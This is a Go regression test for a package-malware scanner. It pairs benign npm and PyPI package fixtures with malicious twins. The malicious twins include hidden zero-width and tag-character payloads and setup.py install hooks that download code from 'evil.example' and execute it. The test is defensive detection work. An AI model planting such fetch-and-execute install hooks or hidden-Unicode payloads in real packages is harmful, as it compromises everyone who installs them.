package cli

// bypass_matrix_test.go — the "we tried to bypass and couldn't" artifact for the
// enforcement-closure wedge, and a permanent regression guard that the FP
// burn-down (docs/launch/fp-rate-measurement.md) relaxed FALSE positives without
// opening a detection hole.
//
// It is a DIFFERENTIAL matrix: for every benign shape we now allow, the malicious
// TWIN that shares the same surface must still BLOCK. A guard that let the benign
// grammar's ZWNJ/ZWJ through by also letting a GlassWorm zero-width payload
// through would be worthless — this test fails if that ever happens.
//
// Scope honesty: this is the behavioral guard verdict (analyzeArtifact), the
// server/proxy + deep-CLI path. The FREE offline CLI's shell hook is
// intentionally bypassable by calling the package manager directly (absolute
// path) — closure there is a proxy-tier + registry-pinning property, documented
// in docs/launch/enforcement-bypass-matrix.md, not a claim this test makes.

import (
	"strings"
	"testing"
)

func TestEnforcementBypassMatrix(t *testing.T) {
	zwsp := "​"                 // ZERO WIDTH SPACE — the GlassWorm byte-encoder
	zwnj, zwj := "‌", "‍"  // identifier-continue (benign in a charset)
	tagA, tagCancel := "\U000E0041", "\U000E007F"
	flagBase := "\U0001F3F4" // waving black flag — emoji tag-sequence base

	cases := []struct {
		name      string
		malicious bool // true = attack (must BLOCK); false = benign twin (must NOT block)
		eco       string
		files     map[string]string
	}{
		// --- Hidden-unicode: benign identifier charset vs GlassWorm payload ---
		{"grammar_charclass_benign", false, "npm", map[string]string{
			"package/package.json":  `{"name":"g","version":"1.0.0"}`,
			"package/dist/less.mjs": "export default [{\"match\":\"[A-Z_a-z" + strings.Repeat("À-Ö"+zwnj+zwj, 14) + "]\"}];\n",
		}},
		{"zerowidth_payload_glassworm", true, "npm", map[string]string{
			"package/package.json": `{"name":"g","version":"1.0.0"}`,
			"package/index.js":     "var k = \"" + strings.Repeat(zwsp, 8) + "\";\n",
		}},

		// --- Tag chars: benign flag emoji vs lone tag payload ---
		{"flag_emoji_benign", false, "npm", map[string]string{
			"package/package.json": `{"name":"f","version":"1.0.0"}`,
			"package/README.md":    "regions: " + flagBase + tagA + tagA + tagCancel + " end\n",
		}},
		{"tag_payload_no_flag", true, "npm", map[string]string{
			"package/package.json": `{"name":"f","version":"1.0.0"}`,
			"package/README.md":    "notes " + tagA + tagA + " end\n",
		}},

		// --- Pip install script: benign native build vs real fetch+exec ---
		{"native_build_benign", false, "pypi", map[string]string{
			"pkg-1.0.0/setup.py": "from setuptools import setup, Extension\nimport subprocess\nsubprocess.check_call(['pkg-config','--cflags','libfoo'])\nsetup(name='pkg', version='1.0.0', ext_modules=[Extension('x',['x.c'])])\n",
		}},
		{"install_fetch_exec", true, "pypi", map[string]string{
			"pkg-1.0.0/setup.py": "from setuptools import setup\nimport urllib.request, os\nurllib.request.urlopen('http://evil.example/x')\nos.system('sh /tmp/x')\nsetup(name='pkg', version='1.0.0')\n",
		}},

		// --- Bundled python payload: setup.py runs a bootstrap that downloads+execs ---
		{"bundled_python_payload", true, "pypi", map[string]string{
			"pkg-1.0.0/setup.py":      "from setuptools import setup\nimport subprocess\nsubprocess.call(['python3', '_bootstrap.py'])\nsetup(name='pkg', version='1.0.0')\n",
			"pkg-1.0.0/_bootstrap.py": "import urllib.request, os\nurllib.request.urlretrieve('http://evil.example/stage2', '/tmp/s2')\nos.system('/tmp/s2')\n",
		}},
	}

	var closed, allowed int
	var leaks []string
	for _, tc := range cases {
		v := analyzeArtifact(tc.eco, makeTGZ(t, tc.files))
		switch {
		case tc.malicious && v.Block:
			closed++
			t.Logf("CLOSED  %-28s BLOCK [%s]", tc.name, v.Reason)
		case tc.malicious && !v.Block:
			leaks = append(leaks, tc.name+" — attack NOT blocked: "+v.Reason)
			t.Errorf("BYPASS OPEN: %s must BLOCK, got %+v", tc.name, v)
		case !tc.malicious && !v.Block:
			allowed++
			t.Logf("ALLOWED %-28s (benign twin, no false block)", tc.name)
		default: // benign twin blocked = a false positive regressed
			t.Errorf("FP REGRESSION: benign %s must NOT block, got %+v", tc.name, v)
		}
	}
	t.Logf("=== ENFORCEMENT BYPASS MATRIX: %d attacks closed, %d benign twins allowed, %d leaks ===",
		closed, allowed, len(leaks))
}
